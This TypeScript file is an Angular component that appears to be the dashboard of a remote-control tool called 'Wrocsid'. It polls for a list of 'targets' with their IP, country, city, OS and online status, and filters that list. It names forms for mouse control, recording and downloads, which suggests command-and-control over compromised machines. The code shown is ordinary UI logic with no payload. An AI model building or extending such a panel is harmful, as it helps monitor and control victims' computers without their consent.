import { Component, OnInit } from '@angular/core';
import { WrocsidService } from 'src/app/services/wrocsid/wrocsid.service';
import { firstValueFrom } from 'rxjs';
import { AbstractControl, FormBuilder, FormGroup, Validators} from '@angular/forms';
import { Target } from 'src/app/Model';

@Component({
  selector: 'app-body',
  templateUrl: './body.component.html',
  styleUrls: ['./body.component.css']
})
export class BodyComponent implements OnInit {

  private panelOpenState: boolean = false
  public targets!: any
  public targetsSearch!: any
  mouseForm!: FormGroup
  recordForm!: FormGroup
  downloadForm!: FormGroup
  mouseFormAll!: FormGroup
  recordFormAll!: FormGroup
  downloadFormAll!: FormGroup
  disabled: boolean = false
  path: string = ""
  search: string = ""
  showOnlineTargetsOnly: boolean = false

  constructor(private wrocsid:WrocsidService, private fb: FormBuilder) {}

  async ngOnInit(): Promise<void> {
    let temp_targets
    this.targets = this.targetsSearch = await firstValueFrom(this.wrocsid.get_targets_data())

    while(true) {
      await this.delay(5 * 1000)
      temp_targets = await firstValueFrom(this.wrocsid.get_targets_data())
      if(!temp_targets) {
        continue
      }
      if(!this.check_if_targets_equal(this.targets, temp_targets)) {
        this.targets = this.targetsSearch = temp_targets
      }
    }
  }

  delay(ms: number) {
    return new Promise( resolve => setTimeout(resolve, ms) );
  }

  check_if_targets_equal(targets: any, temp_targets: any) {
    if(targets.length != temp_targets.length) return false

    for(let i = 0; i < targets.length; i++) {
      if(targets[i].channel_id != temp_targets[i].channel_id) return false
      if(targets[i].identifier != temp_targets[i].identifier) return false
      if(targets[i].metadata.ip != temp_targets[i].metadata.ip) return false
      if(targets[i].metadata.country != temp_targets[i].metadata.country) return false
      if(targets[i].metadata.city != temp_targets[i].metadata.city) return false
      if(targets[i].metadata.os != temp_targets[i].metadata.os) return false
      if(targets[i].online != temp_targets[i].online) return false
    }

    return true
  }

  changePanelState() {
    this.panelOpenState = !this.panelOpenState
  }

  searchFilter(target: Target, search: string): boolean {
    if(this.search.length > 0) {
      return target.identifier.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.channel_id.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.ip.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.country.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.city.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.os.toString().toLowerCase().includes(search.toLowerCase())
    }
    return true
  }

  onlineFilter(target: Target, online: Boolean): boolean {
    return target.online == online
  }

  searchQuery() {
    if (this.search.length > 0) {
      this.targetsSearch = this.targets
      .filter((target: Target) => this.searchFilter(target, this.search))
    } else {
      this.targetsSearch = this.targets
    }

    if(this.showOnlineTargetsOnly) {
      this.targetsSearch = this.targetsSearch.filter((target: Target) => this.onlineFilter(target, this.showOnlineTargetsOnly))
    }
  }

  onlineFilterClicked() {
    if (this.showOnlineTargetsOnly) {
      this.targetsSearch = this.targets
      .filter((target: Target) => this.onlineFilter(target, this.showOnlineTargetsOnly))
      .filter((target: Target) => this.searchFilter(target, this.search))
    } else {
      this.targetsSearch = this.targets.filter((target: Target) => this.searchFilter(target, this.search))
    }
  }
}
